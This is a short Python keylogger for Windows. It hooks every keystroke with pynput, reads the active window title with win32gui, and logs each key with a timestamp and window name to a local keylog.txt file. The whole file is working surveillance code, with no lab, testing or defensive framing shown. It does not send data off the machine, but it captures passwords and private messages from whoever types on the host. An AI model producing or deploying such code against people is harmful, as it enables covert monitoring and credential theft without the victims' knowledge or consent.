import logging
import datetime
import os
from pynput import keyboard
import win32gui  #interacting with the windows gui


# ── Config ────────────────────────────────────────────────
LOG_FILE = os.path.join(os.path.dirname(__file__), "keylog.txt")

# ── Setup logging ─────────────────────────────────────────
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(message)s"
)

# ── Helpers ───────────────────────────────────────────────
def get_active_window():
    """Returns the title of the currently focused window."""
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown"

current_window = ""

def on_press(key):
    global current_window

    # Check if the user switched windows
    active = get_active_window()
    if active != current_window:
        current_window = active
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"\n\n[{timestamp}] Window: {active}")

    # Log the key
    try:
        logging.info(f"{key.char}")          # regular character
    except AttributeError:
        logging.info(f"[{key}]")             # special key e.g. [Key.space]

# ── Main ──────────────────────────────────────────────────
def start():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start()